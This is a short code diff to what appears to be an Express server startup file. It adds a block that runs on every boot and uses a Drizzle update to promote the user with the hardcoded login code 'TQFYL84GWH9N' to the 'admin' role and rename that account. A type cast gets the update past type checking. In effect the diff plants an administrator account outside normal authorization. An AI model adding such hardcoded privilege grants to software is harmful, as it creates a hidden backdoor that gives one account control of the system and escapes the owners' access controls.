@@ -4,7 +4,9 @@ import { registerRoutes } from "./routes";
 import { serveStatic } from "./static";
 import { createServer } from "http";
 import { storage } from "./storage";
-import { pool } from "./db";
+import { pool, db } from "./db";
+import { users } from "@shared/schema";
+import { eq } from "drizzle-orm";
 
 const app = express();
 const httpServer = createServer(app);
@@ -102,6 +104,16 @@ app.use((req, res, next) => {
   } else {
     const { setupVite } = await import("./vite");
     await setupVite(httpServer, app);
+  }
+
+  // Auto-promote specific users by login code (one-time idempotent)
+  try {
+    await db.update(users)
+      .set({ role: "admin", username: "nyc-384772" } as any)
+      .where(eq(users.loginCode, "TQFYL84GWH9N"));
+    log("Auto-promotion check complete");
+  } catch (e) {
+    console.error("Auto-promotion failed:", e);
   }
 
   // Cancel stale pending orders (older than 1 hour) — releases reserved stock back
